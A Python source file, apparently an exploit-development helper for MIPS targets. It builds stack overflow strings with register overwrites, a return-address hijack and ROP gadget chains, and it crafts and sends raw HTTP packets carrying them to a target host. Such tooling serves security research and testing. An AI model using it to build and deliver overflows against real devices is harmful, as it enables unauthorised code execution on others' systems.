import struct
import socket

BIG_ENDIAN = '>L'
LITTLE_ENDIAN = '<L'
POST = b'POST'
GET = b'GET'


def _bc(string):
    """
    Convert strings to bytes if they are not already. Functions should call
    this where needed.

    :param string: String to convert, or not.
    :type string: str

    :return: Bytes representation of the string.
    :rtype: bytes
    """
    if not isinstance(string, bytes):
        return bytes(string, 'utf8')
    return string


class Overflow:
    """
    Class to generate overflow strings for MIPS targets. Upon initialization
    this class will dynamically create class variables to represent the 's'
    registers. They are initialized to 'AAAA' through 'IIII' based on their
    position and can be changed after class initialization is complete.
    """
    def __init__(self, register_dist, register_count, endianess,
                 padding_after_ra=0, gadgets_base=0,
                 overflow_string_contents=''):
        """
        Initialize the overflow class.

        :param register_dist: Distance from the buffer containing the
        overflow to the s0 register in memory.
        :type register_dist: int

        :param register_count: Number of registers available in the function. If
        the only register is s0, then provide 1. If s0 - s7 and fp are available
        the provide 8. The fp register will be designated s8.
        :type register_count: int

        :param endianess: Either BIG_ENDIAN or LITTLE_ENDIAN.
        :type endianess: str

        :param padding_after_ra: Indicate amount of padding after ra on the
        stack.
        :type padding_after_ra: int

        :param gadgets_base: Base address of any addresses used. If multiple
        base addresses are needed set this value to 0 and perform the math
        when setting the register values.
        :type gadgets_base: int

        :param overflow_string_contents: If the target buffer contains a
        string prior to the overwrite, it can be entered here. This value is
        only used to compute length values.
        :type overflow_string_contents: str
        """
        self._register_dist = register_dist
        self._padding = padding_after_ra
        self._register_count = register_count
        self._endianess = endianess
        self._gadget_base = gadgets_base
        self._overflow_string_contents = overflow_string_contents
        self.ra = None
        self.stack_write = b''

        # Dynamically generate s register class variables. $fp == $s8
        for index in range(0, register_count):
            setattr(self, 's%d' % index,
                    bytes(chr(ord('A') + index) * 4, 'utf8'))

    def _pack_register(self, register):
        """
        Pack a register based on the endianess of the target.

        :param register: Register value to pack.
        :type register: bytes or int.

        :return: Packed register value.
        :rtype: bytes
        """
        if type(register) is bytes:
            print(register.hex())
            return register

        register_value = struct.pack(self._endianess, register +
                                     self._gadget_base)

        print('%s (0x%04x + 0x%04x)' % (register_value.hex(),
                                        self._gadget_base, register))
        return register_value

    def _is_safe_write(self, location, length):
        """
        Validate it is safe to write at the position in the stack. Just a
        safety validation to check for a potentially bad ROP chain.

        :param location: Location in the stack to write.
        :type location: int

        :param length: Length of the proposed write.
        :type length: int

        :return: True if safe, False if the location contains data.
        :rtype: bool
        """
        if len(self.stack_write) == location:
            return True

        current_contents = self.stack_write[location:location + length]
        if current_contents == b'X' * length:
            return True
        return False

    def add_to_stack(self, offset, address=None, command=None):
        """
        Write an address or command on the stack passed the $ra address. Used
        for writing ROP gadget addresses and commands on the stack.

        :param offset: Location on the stack to write the value.
        :type offset: int

        :param address: Address to write at the provided offset. Gadget base
        is added to this value prior to the write.
        :type address: int

        :param command: Command to write at the provided offset.
        :type command: str

        :raises: Exception if invalid parameters are provided.
        :raises: Exception if a write collision occurs.
        """
        if not address and not command:
            raise Exception('Must provide address or command.')

        if address and command:
            raise Exception('Address and command cannot be written at the '
                            'same location on the stack.')
        
        if len(self.stack_write) < offset:
            self.stack_write += b'X' * (offset - len(self.stack_write))

        if address:
            if self._is_safe_write(offset, 4):
                self.stack_write = self.stack_write[:offset] + \
                                   self._pack_register(address) + \
                                   self.stack_write[offset + 4:]
            else:
                raise Exception('Address write overwrote values on the stack.')

        elif command:
            if self._is_safe_write(offset, len(command)):
                self.stack_write = self.stack_write[:offset] + \
                                   _bc(command) + \
                                   self.stack_write[offset + len(command):]
            else:
                raise Exception('Command write overwrote values on the stack.')

    def generate(self):
        """
        Generate an overflow string based on $sX registers, $ra, and the stack.

        :return: Overflow string.
        :rtype: bytes
        """
        if self.ra is None:
            raise Exception('Must set $ra before generating an overflow.')

        print('*' * 20)
        print('Overflow Generation')
        print('*' * 20)

        overflow = b'X' * (self._register_dist - len(
            self._overflow_string_contents))

        print('Bytes to first register: 0x%04x(%d) accounting for %d bytes in '
              'the string: %s' % (len(overflow), len(overflow),
                                  len(self._overflow_string_contents),
                                  self._overflow_string_contents))

        for index in range(0, self._register_count):
            s_value = getattr(self, 's%d' % index)
            print('s%d = 0x' % index, end='')
            overflow += self._pack_register(s_value)

        print('ra = 0x', end=''),
        overflow += self._pack_register(self.ra)

        print('stack = %s' % self.stack_write)
        print('*' * 20)
        print()
        return overflow + self.stack_write


class SimpleRequest:
    """
    Generate simple request to use with urllib or requests library.
    """
    def __init__(self, host, port=80, request=None, args=None):
        """

        :param host: IP or host name of target.
        :type host: str

        :param port: Listening port on the target.
        :type port: int

        :param request: Page to request. Should not start with '/'.
        :type request: str

        :param args: Arguments to provide with request.
        :type args: dict
        """
        self.host = host
        self.port = port
        self.request = request
        self.args = args

    def create_url(self):
        url = 'http://%s' % self.host
        if self.port is not 80:
            url += ':%d' % self.port

        if self.request:
            url += '/%s' % self.request

        if self.args:
            url += '?'
            url += '&'.join('%s=%s' % (arg, self.args[arg]) for arg in
                            self.args)
        return url


class CustomRequest:
    """
    Generate a custom request. Use when you need to control header values.
    """
    def __init__(self, host, port, request_type, request_dest, headers, data):
        """

        :param host: IP or host name of target.
        :type host: str

        :param port: Listening port on the target.
        :type port: int

        :param request_type: GET or POST request.
        :type request_type: str

        :param request_dest: Page to request. Should not start with '/'.
        :type request_dest: str

        :param headers: Values to send in the header field.
        :type headers: dict

        :param data: Data to send with the packet.
        :type data: str
        """
        self.host = b'Host: %s:%d' % (_bc(host), port)
        self.request = b'%s /%s HTTP/1.1' % (request_type, _bc(request_dest))
        self.headers = headers
        self.data = _bc(data)

    def create_packet(self):
        """
        Create a packet based on provided values.

        :return: Generated packet.
        :rtype: bytes
        """
        print('*' * 20)
        print('Packet Generation')
        print('*' * 20)
        packet = self.request + b'\r\n'
        packet += self.host + b'\r\n'
        for header in self.headers:
            packet += b'%s: %s\r\n' % (_bc(header), _bc(self.headers[header]))

        data_len = len(self.data) if self.data is not None else 0
        packet += b'Content-Length: %d\r\n\r\n' % data_len
        packet += self.data

        print(packet.decode('utf8', 'ignore'))
        print('*' * 20)
        print()
        return packet


def send_packet(host, port, packet):
    """
    Send a packet to a target.

    :param host: IP or host name of the target.
    :type host: str

    :param port: Listening port on the target.
    :type port: int

    :param packet: Packet to send to the target. Generate from a
    CustomRequest class.
    :type packet: bytes
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))
    sock.send(packet)